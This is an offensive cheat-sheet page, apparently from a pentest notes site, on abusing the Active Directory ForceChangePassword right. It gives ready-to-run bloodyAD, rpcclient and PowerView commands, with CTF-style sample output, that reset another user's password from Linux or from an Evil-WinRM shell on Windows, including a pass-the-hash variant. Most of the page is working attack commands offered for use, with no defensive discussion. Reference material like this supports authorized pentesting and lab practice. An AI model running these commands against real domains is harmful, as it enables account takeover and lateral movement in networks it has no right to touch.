---
title: "ForceChangePassword"
date: 2024-7-18
tags: ["Forcechangepassword", "Powerview", "Active Directory", "Windows", "bloodyAD"]
---

### Change Target User Password (From Linux)

{{< tab set1 tab1 >}}BloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
[+] Password changed successfully!
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>'
```

```console {class="sample-code"}
$ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Test1234'
```

{{< /tabcontent >}}

### Change Target User Password (From Windows)

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Change Target User Password

```console
$password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password -Credential $Cred
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
```

{{< /tabcontent >}}
